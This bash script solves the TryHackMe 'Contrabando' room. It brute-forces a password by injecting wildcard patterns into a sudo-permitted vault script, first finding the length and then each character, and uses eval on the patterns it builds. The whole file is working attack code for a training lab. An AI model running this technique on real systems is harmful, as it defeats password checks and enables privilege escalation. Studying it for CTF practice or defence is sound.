# script by Gemeni Pro
# script for tryhackme room contrabando https://tryhackme.com/room/contrabando
# script to get user password from vault script
# YouTube Video walk through: https://youtu.be/5-izLhcaD6M
#!/bin/bash

# A script to brute-force the password from the /usr/bin/vault script
# by exploiting the bash wildcard expansion vulnerability.

# --- Configuration ---
# The command we are allowed to run via sudo
SUDO_CMD="/usr/bin/bash /usr/bin/vault"
# The string that indicates a successful match
SUCCESS_MSG="Password matched!"

# --- Part 1: Find the Password Length ---
echo "[*] Starting phase 1: Determining password length..."
length=1
while true; do
    # Create a pattern of '?' characters (e.g., ?, ??, ???)
    pattern=$(printf '%*s' "$length" | tr ' ' '?')
    
    # Pipe the pattern to the sudo command and check the output
    # We redirect stderr to /dev/null to keep the output clean
    output=$(echo "$pattern" | sudo $SUDO_CMD 2>/dev/null)

    # Check if the output contains the success message
    if [[ "$output" == *"$SUCCESS_MSG"* ]]; then
        echo "[+] Success! Password length is: $length"
        break
    else
        echo "[-] Testing length $length... Failed."
        ((length++))
        # Add a safety break for very long passwords
        if [ "$length" -gt 30 ]; then
            echo "[!] Password seems to be longer than 30 characters. Aborting."
            exit 1
        fi
    fi
done

# --- Part 2: Brute-force the Characters ---
echo -e "\n[*] Starting phase 2: Brute-forcing characters..."
password=""
# The set of characters to test for each position
charset="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+=-{}[]|:;\"'<>,.?/ "

for (( i=1; i<=$length; i++ )); do
    found_char=false
    for char in $(echo $charset | fold -w1); do
        # Construct the pattern with the known part of the password, the character to test,
        # and wildcards for the remaining unknown part.
        
        # Escape special characters for the echo command
        if [[ "$char" == "*" || "$char" == "?" || "$char" == "[" || "$char" == "]" ]]; then
            test_char="\\$char"
        else
            test_char="$char"
        fi

        known_part="$password"
        unknown_part_len=$((length - i))
        unknown_part=$(printf '%*s' "$unknown_part_len" | tr ' ' '?')
        
        pattern="${known_part}${test_char}${unknown_part}"
        
        # We need to use eval here to correctly handle the escaped characters and wildcards
        output=$(eval echo "\"$pattern\"" | sudo $SUDO_CMD 2>/dev/null)

        if [[ "$output" == *"$SUCCESS_MSG"* ]]; then
            password+="$char"
            echo "[+] Character $i found: '$char'. Password so far: $password"
            found_char=true
            break # Move to the next character position
        fi
    done
    
    if [ "$found_char" = false ]; then
        echo "[!] Could not determine character at position $i. Aborting."
        exit 1
    fi
done

echo -e "\n[+] Brute-force complete!"
echo "    Discovered Password: $password"

